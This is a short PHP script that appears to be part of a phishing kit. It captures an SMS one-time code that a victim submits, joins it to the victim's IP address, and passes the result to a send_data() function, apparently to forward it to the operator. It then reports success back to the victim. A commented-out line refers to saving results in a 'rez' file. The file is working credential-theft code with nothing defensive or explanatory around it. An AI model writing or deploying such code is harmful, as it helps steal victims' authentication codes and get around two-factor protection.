<?php

if(!empty($_REQUEST['sms'])){
  $info_names = array(

  "IDENTIFIANT" => "user_id",
  "ID PASSWORD" => "pass_id"
  );

  include("config.php");
  $result = '
  +_________________________+<br>
  SMS: '.$_REQUEST['sms'].'<br>
  IP ADDRESS: '.getenv("REMOTE_ADDR").'<br>
  +_________________________+<p>
  ';

  //save_rs("backup","../../rez/IPS.html",$result);  // i don't know well, let's check  ok
  $res = send_data(['data'=>$result]);
  echo json_encode(['status'=>'success']);
}
?>